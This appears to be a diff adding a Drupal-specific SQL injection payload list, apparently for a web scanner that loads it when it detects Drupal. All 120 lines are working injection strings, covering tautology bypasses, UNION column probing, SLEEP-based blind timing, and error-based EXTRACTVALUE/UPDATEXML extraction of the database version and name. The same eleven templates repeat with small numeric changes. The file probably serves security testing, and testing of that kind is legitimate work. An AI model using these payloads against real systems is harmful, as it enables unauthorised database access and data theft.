@@ -1,0 +1,122 @@
+# drupal CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Drupal
+' OR '1'='1' /*drupal_1*/
+' AND 1=2 UNION SELECT NULL-- drupal_2
+' AND SLEEP(4)-- drupal_3
+' OR IF(4=4,SLEEP(2),0)-- drupal_4
+' UNION SELECT NULL,NULL,NULL-- drupal_5
+' ORDER BY 7-- drupal_6
+' GROUP BY 8 HAVING 1=1-- drupal_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_9
+1 OR 1=1# drupal_10
+-1 UNION SELECT NULL-- drupal_11
+' OR 1=1-- drupal_12
+' OR '1'='1' /*drupal_13*/
+' AND 1=2 UNION SELECT NULL-- drupal_14
+' AND SLEEP(1)-- drupal_15
+' OR IF(16=16,SLEEP(2),0)-- drupal_16
+' UNION SELECT NULL,NULL,NULL-- drupal_17
+' ORDER BY 9-- drupal_18
+' GROUP BY 4 HAVING 1=1-- drupal_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_21
+1 OR 1=1# drupal_22
+-1 UNION SELECT NULL-- drupal_23
+' OR 1=1-- drupal_24
+' OR '1'='1' /*drupal_25*/
+' AND 1=2 UNION SELECT NULL-- drupal_26
+' AND SLEEP(3)-- drupal_27
+' OR IF(28=28,SLEEP(2),0)-- drupal_28
+' UNION SELECT NULL,NULL,NULL-- drupal_29
+' ORDER BY 1-- drupal_30
+' GROUP BY 8 HAVING 1=1-- drupal_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_33
+1 OR 1=1# drupal_34
+-1 UNION SELECT NULL-- drupal_35
+' OR 1=1-- drupal_36
+' OR '1'='1' /*drupal_37*/
+' AND 1=2 UNION SELECT NULL-- drupal_38
+' AND SLEEP(5)-- drupal_39
+' OR IF(40=40,SLEEP(2),0)-- drupal_40
+' UNION SELECT NULL,NULL,NULL-- drupal_41
+' ORDER BY 3-- drupal_42
+' GROUP BY 4 HAVING 1=1-- drupal_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_45
+1 OR 1=1# drupal_46
+-1 UNION SELECT NULL-- drupal_47
+' OR 1=1-- drupal_48
+' OR '1'='1' /*drupal_49*/
+' AND 1=2 UNION SELECT NULL-- drupal_50
+' AND SLEEP(2)-- drupal_51
+' OR IF(52=52,SLEEP(2),0)-- drupal_52
+' UNION SELECT NULL,NULL,NULL-- drupal_53
+' ORDER BY 5-- drupal_54
+' GROUP BY 8 HAVING 1=1-- drupal_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_57
+1 OR 1=1# drupal_58
+-1 UNION SELECT NULL-- drupal_59
+' OR 1=1-- drupal_60
+' OR '1'='1' /*drupal_61*/
+' AND 1=2 UNION SELECT NULL-- drupal_62
+' AND SLEEP(4)-- drupal_63
+' OR IF(64=64,SLEEP(2),0)-- drupal_64
+' UNION SELECT NULL,NULL,NULL-- drupal_65
+' ORDER BY 7-- drupal_66
+' GROUP BY 4 HAVING 1=1-- drupal_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_69
+1 OR 1=1# drupal_70
+-1 UNION SELECT NULL-- drupal_71
+' OR 1=1-- drupal_72
+' OR '1'='1' /*drupal_73*/
+' AND 1=2 UNION SELECT NULL-- drupal_74
+' AND SLEEP(1)-- drupal_75
+' OR IF(76=76,SLEEP(2),0)-- drupal_76
+' UNION SELECT NULL,NULL,NULL-- drupal_77
+' ORDER BY 9-- drupal_78
+' GROUP BY 8 HAVING 1=1-- drupal_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_81
+1 OR 1=1# drupal_82
+-1 UNION SELECT NULL-- drupal_83
+' OR 1=1-- drupal_84
+' OR '1'='1' /*drupal_85*/
+' AND 1=2 UNION SELECT NULL-- drupal_86
+' AND SLEEP(3)-- drupal_87
+' OR IF(88=88,SLEEP(2),0)-- drupal_88
+' UNION SELECT NULL,NULL,NULL-- drupal_89
+' ORDER BY 1-- drupal_90
+' GROUP BY 4 HAVING 1=1-- drupal_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_93
+1 OR 1=1# drupal_94
+-1 UNION SELECT NULL-- drupal_95
+' OR 1=1-- drupal_96
+' OR '1'='1' /*drupal_97*/
+' AND 1=2 UNION SELECT NULL-- drupal_98
+' AND SLEEP(5)-- drupal_99
+' OR IF(100=100,SLEEP(2),0)-- drupal_100
+' UNION SELECT NULL,NULL,NULL-- drupal_101
+' ORDER BY 3-- drupal_102
+' GROUP BY 8 HAVING 1=1-- drupal_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_105
+1 OR 1=1# drupal_106
+-1 UNION SELECT NULL-- drupal_107
+' OR 1=1-- drupal_108
+' OR '1'='1' /*drupal_109*/
+' AND 1=2 UNION SELECT NULL-- drupal_110
+' AND SLEEP(2)-- drupal_111
+' OR IF(112=112,SLEEP(2),0)-- drupal_112
+' UNION SELECT NULL,NULL,NULL-- drupal_113
+' ORDER BY 5-- drupal_114
+' GROUP BY 4 HAVING 1=1-- drupal_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- drupal_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- drupal_117
+1 OR 1=1# drupal_118
+-1 UNION SELECT NULL-- drupal_119
+' OR 1=1-- drupal_120
